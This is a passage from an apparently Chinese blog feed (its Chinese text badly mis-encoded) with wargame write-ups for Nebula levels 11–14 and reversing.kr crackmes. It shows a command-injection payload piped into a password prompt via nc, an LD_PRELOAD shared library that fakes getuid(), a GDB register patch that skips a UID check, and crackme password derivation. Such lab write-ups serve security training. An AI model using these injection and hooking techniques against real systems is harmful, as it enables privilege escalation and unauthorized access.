   0x080489e4 &amp;lt;+29&amp;gt;:    add    0x8(%ebp),%eax
   0x080489e7 &amp;lt;+32&amp;gt;:    mov    -0xc(%ebp),%edx
   0x080489ea &amp;lt;+35&amp;gt;:    add    0x8(%ebp),%edx
   0x080489ed &amp;lt;+38&amp;gt;:    movzbl (%edx),%edx
   0x080489f0 &amp;lt;+41&amp;gt;:    mov    %edx,%ecx
   0x080489f2 &amp;lt;+43&amp;gt;:    mov    -0x10(%ebp),%edx
   0x080489f5 &amp;lt;+46&amp;gt;:    xor    %ecx,%edx
   0x080489f7 &amp;lt;+48&amp;gt;:    mov    %dl,(%eax)
   0x080489f9 &amp;lt;+50&amp;gt;:    mov    -0xc(%ebp),%eax
   0x080489fc &amp;lt;+53&amp;gt;:    add    0x8(%ebp),%eax
   0x080489ff &amp;lt;+56&amp;gt;:    movzbl (%eax),%eax
   0x08048a02 &amp;lt;+59&amp;gt;:    movsbl %al,%eax
   0x08048a05 &amp;lt;+62&amp;gt;:    sub    %eax,-0x10(%ebp)
   0x08048a08 &amp;lt;+65&amp;gt;:    addl   $0x1,-0xc(%ebp)
   0x08048a0c &amp;lt;+69&amp;gt;:    mov    -0xc(%ebp),%eax
   0x08048a0f &amp;lt;+72&amp;gt;:    cmp    0xc(%ebp),%eax
   0x08048a12 &amp;lt;+75&amp;gt;:    jl     0x80489e1 &amp;lt;process+26&amp;gt;
   0x08048a14 &amp;lt;+77&amp;gt;:    call   0x8048700 &amp;lt;getgid@plt&amp;gt;
   0x08048a19 &amp;lt;+82&amp;gt;:    mov    %eax,(%esp)
   0x08048a1c &amp;lt;+85&amp;gt;:    call   0x8048690 &amp;lt;setgid@plt&amp;gt;
   0x08048a21 &amp;lt;+90&amp;gt;:    call   0x8048630 &amp;lt;getuid@plt&amp;gt;
   0x08048a26 &amp;lt;+95&amp;gt;:    mov    %eax,(%esp)
   0x08048a29 &amp;lt;+98&amp;gt;:    call   0x8048730 &amp;lt;setuid@plt&amp;gt;
   0x08048a2e &amp;lt;+103&amp;gt;:   mov    0x8(%ebp),%eax
   0x08048a31 &amp;lt;+106&amp;gt;:   mov    %eax,(%esp)
   0x08048a34 &amp;lt;+109&amp;gt;:   call   0x80486a0 &amp;lt;system@plt&amp;gt;
   0x08048a39 &amp;lt;+114&amp;gt;:   leave  
   0x08048a3a &amp;lt;+115&amp;gt;:   ret  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¸Šé¢æ˜¯flag11ä¸­&lt;code&gt;process()&lt;/code&gt;å®Œæ•´çš„åæ±‡ç¼–ä»£ç ã€‚å¯ä»¥çœ‹åˆ°0x08048a14å¼€å§‹æœ‰&lt;code&gt;setgid()&lt;/code&gt;å’Œ&lt;code&gt;setuid()&lt;/code&gt;çš„æ“ä½œã€‚è¿™æ®µåæ±‡ç¼–å¦‚æœç¿»è¯‘åˆ°Cè¯­è¨€æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;void process(char *buffer, int length)
{
  ...

  setgid(getgid());
  setuid(getuid());

  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;åŠ å…¥è¿™ä¸¤å¥ä¹‹åï¼Œç¨‹åºåœ¨æ‰§è¡Œ&lt;code&gt;system()&lt;/code&gt;ä¹‹å‰ä¼šå¼ºåˆ¶è¿˜åŸuidå’Œgidï¼Œå› æ­¤ç¨‹åºæœ¬èº«çš„setuidæƒé™å¤±æ•ˆï¼Œç¨‹åºæ‰§è¡Œè€…æ°¸è¿œæ˜¯level11ï¼Œè€Œä¸æ˜¯flag11ï¼Œæ‰€ä»¥å°±ä¸å¯èƒ½æˆåŠŸäº†ã€‚æˆ‘è¿™é‡Œä¹Ÿè¯•éªŒäº†ç”¨LD_PRELOADçš„åŠæ³•Hackæ‰&lt;code&gt;getuid()&lt;/code&gt;å’Œ&lt;code&gt;getpid()&lt;/code&gt;ï¼Œä½†æ˜¯å¾ˆå¯æƒœæ–¹æ³•æ— æ•ˆï¼Œå› ä¸ºæ²¡æœ‰æƒé™ã€‚&lt;/p&gt;
&lt;h1&gt;Nebula level12&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;
&lt;p&gt;50001ç«¯å£æœ‰ä¸ªåé—¨è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="lua"&gt;local socket = require(&amp;quot;socket&amp;quot;)
local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001))

function hash(password) 
  prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)
  data = prog:read(&amp;quot;*all&amp;quot;)
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send(&amp;quot;Password: &amp;quot;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
    print(&amp;quot;trying &amp;quot; .. line) -- log from where ;\
    local h = hash(line)

    if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
      client:send(&amp;quot;Better luck next time\n&amp;quot;);
    else
      client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
    end

  end

  client:close()
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¸€æ®µLuaè„šæœ¬ï¼Œé€»è¾‘ç®€å•æ¸…æ™°ã€‚è„šæœ¬è¯­è¨€çš„å¥½å¤„å°±æ˜¯ä½ ä¸æ‡‚è¯­æ³•ï¼Œä¹Ÿèƒ½çŒœå‡ºä¸ªå¤§æ¦‚ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ®µè„šæœ¬ç›‘å¬50001ç«¯å£ï¼Œå¹¶éœ€è¦è¿æ¥åæäº¤å¯†ç ã€‚æ˜¾ç„¶æˆ‘ä»¬æœ€å…³å¿ƒçš„æ˜¯èƒ½ä¸èƒ½è¿è¡Œshellè„šæœ¬ï¼Œå› æ­¤å®šä½åˆ°&lt;code&gt;hash()&lt;/code&gt;ä¸­çš„&lt;code&gt;popen()&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ç›´æ¥æˆªæ–­çœ‹çœ‹å¯ä¸å¯ä»¥ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level12@nebula:~$ nc 127.0.0.1 50001
Password: ;/bin/getflag &amp;gt; /tmp/flag12.txt
Better luck next time
level12@nebula:~$ cat /tmp/flag12.txt 
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¾—æ¥å…¨ä¸è´¹å·¥å¤«ï¼&lt;/p&gt;
&lt;h1&gt;Nebula level13&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªå…·æœ‰å®‰å…¨éªŒè¯çš„ç¨‹åºï¼Œå¯ä»¥é˜»æ­¢éæŒ‡å®šç”¨æˆ·çš„æ‰§è¡Œã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
    printf(&amp;quot;Security failure detected. UID %d started us, we expect %d\n&amp;quot;, getuid(), FAKEUID);
    printf(&amp;quot;The system administrators will be notified of this violation\n&amp;quot;);
    exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf(&amp;quot;your token is %s\n&amp;quot;, token);

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šæ£€æµ‹ç”¨æˆ·çš„UIDæ˜¯å¦ä¸º1000ï¼ˆé€šè¿‡&lt;code&gt;cat /etc/passwd | grep 1000&lt;/code&gt;å‘ç°uid=1000çš„ç”¨æˆ·ä¸ºnebulaï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œå¯ä»¥æƒ³åŠæ³•é€šè¿‡å¹²é¢„getuid()çš„è¿”å›å€¼æ¥å¾—åˆ°ç›®çš„ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨GDBå¯¹è¿”å›å€¼ä½œå‡ºä¿®æ”¹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;gdb ./flag13
...
(gdb) disas main
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;åæ±‡ç¼–mainå‡½æ•°åå‘ç°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;Dump of assembler code for function main:
...
   0x080484ef &amp;lt;+43&amp;gt;:    call   0x80483c0 &amp;lt;getuid@plt&amp;gt;
   0x080484f4 &amp;lt;+48&amp;gt;:    cmp    $0x3e8,%eax
...
---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---q
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„è°ƒç”¨getuid()ä¹‹åä¼šæŠŠè¿”å›å€¼æ”¾åˆ°eaxä¸­ï¼Œå› æ­¤åªè¦åœ¨&lt;code&gt;0x080484f4&lt;/code&gt;å¤„ä¸‹æ–­ï¼Œè®©ç¨‹åºè·‘èµ·æ¥åä¿®æ”¹eaxä¸º1000å³å¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;(gdb) b *0x080484f4
Breakpoint 1 at 0x80484f4
(gdb) r
Starting program: /home/flag13/flag13 

Breakpoint 1, 0x080484f4 in main ()
(gdb) p $eax
$1 = 1014
(gdb) set $eax=1000
(gdb) p $eax
$2 = 1000
(gdb) c
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 15690) exited with code 063]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¾—åˆ°å¯†ç &lt;code&gt;b705702b-76a8-42b0-8844-3adabbe5ac58&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å½“ç„¶æ­¤é¢˜è¿˜æœ‰ä¸€ç§è§£æ³•ï¼Œå°±æ˜¯åŠ«æŒgetuid()å‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆé€šè¿‡&lt;code&gt;file&lt;/code&gt;å‘ç°flag13è°ƒç”¨äº†å…±äº«åº“ï¼Œæ¥ç€åˆ›å»ºä¸€ä¸ªCæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

uid_t getuid(void) {
    return 1000;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹åç¼–è¯‘å¹¶é€šè¿‡LD_PRELOADç¯å¢ƒå˜é‡æ›¿æ¢æ‰çœŸå®çš„getuid()å‡½æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;gcc -fPIC -shared -o preload.so preload.c
export LD_PRELOAD=/home/level13/preload.so
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹åé€šè¿‡straceæ¥è°ƒç”¨ï¼Œå³å¯è§‚å¯Ÿåˆ°ç»“æœï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level13@nebula:~$ strace /home/flag13/flag13
...
write(1, &amp;quot;your token is b705702b-76a8-42b0&amp;quot;..., 51your token is b705702b-76a8-42b0-8844-3adabbe5ac58
) = 51
...
&lt;/code&gt;&lt;/pre&gt;

&lt;h1&gt;Nebula level14&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)&lt;/p&gt;
&lt;p&gt;ç¨‹åºåŠ å¯†äº†è¾“å…¥å¹¶å†™å…¥æ ‡å‡†è¾“å‡ºï¼ŒåŠ å¯†çš„tokenæ–‡ä»¶å’Œç¨‹åºéƒ½åœ¨flag14çš„å®¶ç›®å½•ä¸­ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è¿™é¢˜éå¸¸ç®€å•ï¼Œç ´è§£åŠ å¯†ç®—æ³•ï¼Œæœ¬æ¥ä»¥ä¸ºéœ€è¦é€†å‘ï¼Œç”±äºè§„å¾‹å®åœ¨å¤ªç®€å•ï¼Œå®éªŒäº†å‡ æ¬¡å°±å‡ºæ¥äº†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level14@nebula:/home/flag14$ ./flag14
./flag14
    -e  Encrypt input
level14@nebula:/home/flag14$ ./flag14 -e
123456
13579;
level14@nebula:/home/flag14$ ./flag14 -e
654321
666666
level14@nebula:/home/flag14$ ./flag14 -e
11111111111111111111111111
123456789:;&amp;lt;=&amp;gt;?@ABCDEFGHIJ$^C
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæŠŠè¾“å…¥æ•°æ®çœ‹æˆä¸€ä¸ªæ•°ç»„ï¼ŒåŠ å¯†æ•°æ®ç›¸å½“äºè¾“å…¥æ•°æ®åŠ ä¸Šæ•°æ®çš„ä¸‹æ ‡ï¼ˆä»0å¼€å§‹ï¼‰ï¼Œäºæ˜¯å†™å‡ºç®—æ³•ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;plain = '123456'
encrypt = ''

for i in range(len(plain)):
    encrypt += chr(ord(plain[i:i+1]) + i)

print encrypt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å› æ­¤å¯ä»¥å†™å‡ºé€†è¿ç®—å¹¶æŠŠtokenæ–‡ä»¶ç»™è§£å¯†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;token = open('/home/flag14/token')
encrypt = token.read()[:-1]
plain = ''

for i in range(len(encrypt)):
   plain += chr(ord(encrypt[i:i+1]) - i)

print plain
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æœ€åå¾—åˆ°tokenï¼š8457c118-887c-4e40-a5a6-33a25353165ã€‚&lt;/p&gt;</summary><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>reversing.krå››é“Easyé¢˜è§£é¢˜æ”»ç•¥</title><link href="http://blog.yyx.name/posts/reversing-kr-4-easy-challenges.html" rel="alternate"></link><updated>2014-09-10T23:51:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-10:posts/reversing-kr-4-easy-challenges.html</id><summary type="html">&lt;h1&gt;å¼€ç¯‡åºŸè¯&lt;/h1&gt;
&lt;p&gt;Nebulaçš„level11åšçš„æœ‰ç‚¹å¤´å¤§ï¼Œè¿™æ—¶å¤§ç¥Jackåˆå‘æ¥äº†é€†å‘çš„é¢˜ç›®ï¼Œè®©æˆ‘èµ¶ç´§ç»ƒç»ƒã€‚è™½ç„¶æˆ‘è´Ÿè´£æ¯”èµ›ä¸­é€†å‘ç±»çš„é¢˜ç›®ï¼Œä½†é€†å‘é¢˜ä¸€èˆ¬éƒ½æ¯”è¾ƒéš¾ï¼Œå…ˆæ”¾å‡ºæ¥çš„é¢˜åŸºæœ¬éƒ½æ˜¯å…¶ä»–ç±»åˆ«ï¼Œæ‰€ä»¥æˆ‘å°±å½»åº•æˆäº†æ‰“ï¼ˆè·‘ï¼‰è¾…ï¼ˆé¾™ï¼‰åŠ©ï¼ˆå¥—ï¼‰çš„è§’è‰²~~~&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡è¿™å¥—é¢˜ç›®æ¥è‡ª&lt;a href="http://reversing.kr/"&gt;reversing.kr&lt;/a&gt;ï¼Œæ£’å­çš„é€†å‘æŒ‘æˆ˜ç½‘ç«™ã€‚è¯è¯´æ£’å­çš„Hackingèƒ½åŠ›è¿˜æ˜¯æŒºå¼ºçš„ï¼Œæ®è¯´æ˜¯ä¸ªä»€ä¹ˆæ£’å­çš„ä¼˜é€‰è®¡åˆ’æå‡ºæ¥çš„æˆæœã€‚&lt;/p&gt;
&lt;p&gt;æœ¬ç¯‡å°±è®°å½•ä¸€ä¸‹4é“åç§°æ˜¯Easyå¼€å¤´é¢˜ç›®ï¼Œåˆ†åˆ«æ˜¯Easy Crackã€Easy Keygenã€Easy Unpackå’ŒEasy ELFã€‚è¿™å››é¢˜éš¾åº¦éå¸¸ä½ï¼Œç†Ÿç»ƒåœ°è¯æŒæ¡å¥½èŠ‚å¥æ„Ÿå¯ä»¥è¹­è¹­è¹­çš„ç§’é¢˜â€¦â€¦&lt;/p&gt;
&lt;h1&gt;Easy Crack&lt;/h1&gt;
&lt;p&gt;ç¨‹åºå¯åŠ¨åè¾“å…¥ä»»æ„å­—ç¬¦ä¼šæ˜¾ç¤ºä¸€ä¸ªMessageBoxçš„Incorrect Passwordã€‚æ‰“å¼€OllyDbgï¼Œè½½å…¥ç¨‹åºåæŸ¥æ‰¾åˆ°ç›®æ ‡å­—ç¬¦ä¸²Incorrect Passwordï¼Œä¹‹åè½¬åˆ°ç¨‹åºï¼Œå­—ç¬¦ä¸²å‰åä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00401080  /$  83EC 64       sub esp,64
00401083  |.  57            push edi
00401084  |.  B9 18000000   mov ecx,18
00401089  |.  33C0          xor eax,eax
0040108B  |.  8D7C24 05     lea edi,dword ptr ss:[esp+5]
0040108F  |.  C64424 04 00  mov byte ptr ss:[esp+4],0
00401094  |.  6A 64         push 64                                  ; /Count = 64 (100.)
00401096  |.  F3:AB         rep stos dword ptr es:[edi]              ; |
00401098  |.  66:AB         stos word ptr es:[edi]                   ; |
0040109A  |.  AA            stos byte ptr es:[edi]                   ; |
0040109B  |.  8B7C24 70     mov edi,dword ptr ss:[esp+70]            ; |
0040109F  |.  8D4424 08     lea eax,dword ptr ss:[esp+8]             ; |
004010A3  |.  50            push eax                                 ; |Buffer
004010A4  |.  68 E8030000   push 3E8                                 ; |ControlID = 3E8 (1000.)
004010A9  |.  57            push edi                                 ; |hWnd
004010AA  |.  FF15 9C504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.GetDlgItemTe&amp;gt;; \GetDlgItemTextA

...

00401114  |.  6A 40         push 40                                  ; /Style = MB_OK|MB_ICONASTERISK|MB_APPLMODAL
00401116  |.  68 58604000   push Easy_Cra.00406058                   ; |EasyCrackMe
0040111B  |.  68 44604000   push Easy_Cra.00406044                   ; |Congratulation !!
00401120  |.  57            push edi                                 ; |hOwner
00401121  |.  FF15 A0504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.MessageBoxA&amp;gt;&amp;gt;; \MessageBoxA
00401127  |.  6A 00         push 0                                   ; /Result = 0
00401129  |.  57            push edi                                 ; |hWnd
0040112A  |.  FF15 A4504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.EndDialog&amp;gt;]  ; \EndDialog
00401130  |.  5F            pop edi
00401131  |.  83C4 64       add esp,64
00401134  |.  C3            retn
00401135  |&amp;gt;  6A 10         push 10                                  ; /Style = MB_OK|MB_ICONHAND|MB_APPLMODAL
00401137  |.  68 58604000   push Easy_Cra.00406058                   ; |EasyCrackMe
0040113C  |.  68 30604000   push Easy_Cra.00406030                   ; |Incorrect Password
00401141  |.  57            push edi                                 ; |hOwner
00401142  |.  FF15 A0504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.MessageBoxA&amp;gt;&amp;gt;; \MessageBoxA
00401148  |.  5F            pop edi
00401149  |.  83C4 64       add esp,64
0040114C  \.  C3            retn
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¨‹åºé€šè¿‡GetDlgItemTextAè·å–è¾“å…¥å­—ç¬¦ä¸²ï¼Œä¹‹åç»è¿‡ä¸€æ®µç®—æ³•åˆ¤å®šå¯¹é”™ã€‚ä¸‹é¢åˆ†æç®—æ³•ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;004010B0  |.  807C24 05 61  cmp byte ptr ss:[esp+5],61
004010B5  |.  75 7E         jnz short Easy_Cra.00401135
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;é¦–å…ˆç¡®å®šesp+5ä½ç½®å­—ç¬¦ä¸º0x61ï¼Œå³aã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;004010B7  |.  6A 02         push 2
004010B9  |.  8D4C24 0A     lea ecx,dword ptr ss:[esp+A]
004010BD  |.  68 78604000   push Easy_Cra.00406078                   ;  5y
004010C2  |.  51            push ecx
004010C3  |.  E8 88000000   call Easy_Cra.00401150                   ;  strcmp
004010C8  |.  83C4 0C       add esp,0C
004010CB  |.  85C0          test eax,eax
004010CD  |.  75 66         jnz short Easy_Cra.00401135
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹ååˆ¤æ–­esp+Aå¤„å­—ç¬¦ä¸²æ˜¯å¦ä¸º5yã€‚ è¿™é‡Œç”±äº&lt;code&gt;push 2&lt;/code&gt;æŒ‡ä»¤ï¼Œæ ˆé’ˆä¼šä¸Šç§»4byteï¼Œå› æ­¤æ­¤æ—¶esp=esp-4ï¼Œæ‰€ä»¥ç°åœ¨çš„esp+Aç›¸å½“äºä¸Šä¸€æ¬¡çš„esp-4+Aï¼ˆesp+6ï¼‰ï¼Œè¿™æ ·å°±å’Œä¸Šä¸€æ¬¡esp+5æˆä¸ºè¿ç»­çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯3ä¸ªè¿ç»­çš„å­—ç¬¦ä¸ºa5yã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;004010CF  |.  53            push ebx
004010D0  |.  56            push esi
004010D1  |.  BE 6C604000   mov esi,Easy_Cra.0040606C                ;  R3versing
004010D6  |.  8D4424 10     lea eax,dword ptr ss:[esp+10]
004010DA  |&amp;gt;  8A10          /mov dl,byte ptr ds:[eax]
004010DC  |.  8A1E          |mov bl,byte ptr ds:[esi]
004010DE  |.  8ACA          |mov cl,dl
004010E0  |.  3AD3          |cmp dl,bl
004010E2  |.  75 1E         |jnz short Easy_Cra.00401102
004010E4  |.  84C9          |test cl,cl
004010E6  |.  74 16         |je short Easy_Cra.004010FE
004010E8  |.  8A50 01       |mov dl,byte ptr ds:[eax+1]
004010EB  |.  8A5E 01       |mov bl,byte ptr ds:[esi+1]
004010EE  |.  8ACA          |mov cl,dl
004010F0  |.  3AD3          |cmp dl,bl
004010F2  |.  75 0E         |jnz short Easy_Cra.00401102
004010F4  |.  83C0 02       |add eax,2
004010F7  |.  83C6 02       |add esi,2
004010FA  |.  84C9          |test cl,cl
004010FC  |.^ 75 DC         \jnz short Easy_Cra.004010DA
004010FE  |&amp;gt;  33C0          xor eax,eax
00401100  |.  EB 05         jmp short Easy_Cra.00401107
00401102  |&amp;gt;  1BC0          sbb eax,eax
00401104  |.  83D8 FF       sbb eax,-1
00401107  |&amp;gt;  5E            pop esi
00401108  |.  5B            pop ebx
00401109  |.  85C0          test eax,eax
0040110B  |.  75 28         jnz short Easy_Cra.00401135
0040110D  |.  807C24 04 45  cmp byte ptr ss:[esp+4],45
00401112  |.  75 21         jnz short Easy_Cra.00401135
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹ååŒ¹é…å­—ç¬¦ä¸²R3versingï¼Œå¹¶åœ¨å­—ç¬¦ä¸²å¤´éƒ¨ï¼ˆesp+4å¤„ï¼‰æ·»åŠ å­—ç¬¦ä¸ºEã€‚å› æ­¤ç­”æ¡ˆä¸ºEa5yR3versingã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œç®—æ³•ç”±äºæ¶‰åŠåˆ°espçš„æ”¹å˜ï¼Œå› æ­¤ODè·Ÿè¸ªèµ·æ¥æ¯”IDAé™æ€åˆ†ææ›´åŠ ç®€å•ã€‚å¯ä»¥ç›´æ¥å°†ç¨‹åºè·‘èµ·æ¥ï¼Œå½“ç¨‹åºç¢°åˆ°ç›¸å…³åˆ¤æ–­çš„åœ°æ–¹ï¼ˆä¸€èˆ¬æ˜¯cmpï¼‰ä¼šæ”¹å˜æ ‡å¿—ä½ï¼ˆä¸€èˆ¬æ˜¯ZFï¼‰ï¼Œåªéœ€è¦æ”¹å˜æ ‡å¿—ä½å¯„å­˜å™¨çš„å€¼è®©å®ƒæŒ‰ç…§ä½ è¦çš„é€»è¾‘æ‰§è¡Œä¸‹å»å³å¯ï¼Œå½“ç„¶ä½ éœ€è¦åŒæ—¶è®°å½•è¿™äº›è®©é€»è¾‘ä¿æŒæ­£ç¡®çš„å­—ç¬¦ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨æ ˆï¼ˆæˆ–æ•°æ®åŒºï¼‰ä¸­ä½œå‡ºä¿®æ”¹ã€‚ä¹‹åå½“ç¨‹åºè·‘å®Œä¹‹åï¼Œä½ çš„æ ˆï¼ˆæˆ–æ•°æ®åŒºï¼‰ä¸­å°±æ˜¯ä¸€ä¸ªæ­£ç¡®çš„å€¼ã€‚æœ¬ç¨‹åºæ ˆçš„ç»“æ„å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="../statics/reversing-kr-4-easy-challenges/2014-09-13_234947.jpg" /&gt;&lt;/p&gt;
&lt;h1&gt;Easy Keygen&lt;/h1&gt;
&lt;p&gt;æ³¨å†Œæœºé¢˜ï¼Œreadmeè¦æ±‚Find the Name when the Serial is 5B134977135E7D13ã€‚ç¨‹åºè·‘èµ·æ¥ï¼Œè¦æ±‚è¾“å…¥åå­—å’Œåºåˆ—å·ï¼Œæµ‹è¯•äº†ä¸€ä¸‹Nameä¸ºabcdeå’Œéšæœºçš„åºåˆ—å·ï¼Œæç¤ºé”™è¯¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="dos"&gt;C:\Users\GreatYYX&amp;gt;&amp;quot;F:\Crack\reversingkr\Easy_KeygenMe\Easy Keygen.exe&amp;quot;

Input Name: abcde
Input Serial: 12345
Wrong
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¼€ODè·Ÿç€è·‘ä¸€ä¸‹ï¼Œä¸‹æ–­ç‚¹åœ¨InputNameå’ŒInputSerialå¤„ï¼Œå¯ä»¥çœ‹åˆ°åˆ¤å®šå¯¹é”™å‡½æ•°å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00401000  /$  81EC 30010000 sub esp,130
00401006  |.  55            push ebp
00401007  |.  56            push esi
00401008  |.  57            push edi
00401009  |.  B9 18000000   mov ecx,18
0040100E  |.  33C0          xor eax,eax
00401010  |.  8D7C24 11     lea edi,dword ptr ss:[esp+11]
00401014  |.  C64424 10 00  mov byte ptr ss:[esp+10],0
00401019  |.  C64424 74 00  mov byte ptr ss:[esp+74],0
0040101E  |.  F3:AB         rep stos dword ptr es:[edi]
00401020  |.  66:AB         stos word ptr es:[edi]
00401022  |.  AA            stos byte ptr es:[edi]
00401023  |.  B9 31000000   mov ecx,31
00401028  |.  33C0          xor eax,eax
0040102A  |.  8D7C24 75     lea edi,dword ptr ss:[esp+75]
0040102E  |.  68 60804000   push Easy_Key.00408060                   ;  Input Name:
00401033  |.  F3:AB         rep stos dword ptr es:[edi]
00401035  |.  66:AB         stos word ptr es:[edi]
00401037  |.  AA            stos byte ptr es:[edi]
00401038  |.  C64424 10 10  mov byte ptr ss:[esp+10],10              ;  array, 3 bytes
0040103D  |.  C64424 11 20  mov byte ptr ss:[esp+11],20
00401042  |.  C64424 12 30  mov byte ptr ss:[esp+12],30
00401047  |.  E8 6D010000   call Easy_Key.004011B9
0040104C  |.  83C4 04       add esp,4
0040104F  |.  8D4424 10     lea eax,dword ptr ss:[esp+10]
00401053  |.  50            push eax
00401054  |.  68 5C804000   push Easy_Key.0040805C                   ;  %s
00401059  |.  E8 44010000   call Easy_Key.004011A2                   ;  input function
0040105E  |.  8D7C24 18     lea edi,dword ptr ss:[esp+18]
00401062  |.  83C9 FF       or ecx,FFFFFFFF
00401065  |.  33C0          xor eax,eax
00401067  |.  83C4 08       add esp,8
0040106A  |.  33ED          xor ebp,ebp
0040106C  |.  33F6          xor esi,esi
0040106E  |.  F2:AE         repne scas byte ptr es:[edi]
00401070  |.  F7D1          not ecx
00401072  |.  49            dec ecx
00401073  |.  85C9          test ecx,ecx
00401075  |.  7E 3F         jle short Easy_Key.004010B6
00401077  |&amp;gt;  83FE 03       /cmp esi,3
0040107A  |.  7C 02         |jl short Easy_Key.0040107E
0040107C  |.  33F6          |xor esi,esi
0040107E  |&amp;gt;  0FBE4C34 0C   |movsx ecx,byte ptr ss:[esp+esi+C]
00401083  |.  0FBE542C 10   |movsx edx,byte ptr ss:[esp+ebp+10]
00401088  |.  33CA          |xor ecx,edx
0040108A  |.  8D4424 74     |lea eax,dword ptr ss:[esp+74]
0040108E  |.  51            |push ecx
0040108F  |.  50            |push eax
00401090  |.  8D4C24 7C     |lea ecx,dword ptr ss:[esp+7C]
00401094  |.  68 54804000   |push Easy_Key.00408054                  ;  %s%02X
00401099  |.  51            |push ecx
0040109A  |.  E8 B1000000   |call Easy_Key.00401150
0040109F  |.  83C4 10       |add esp,10
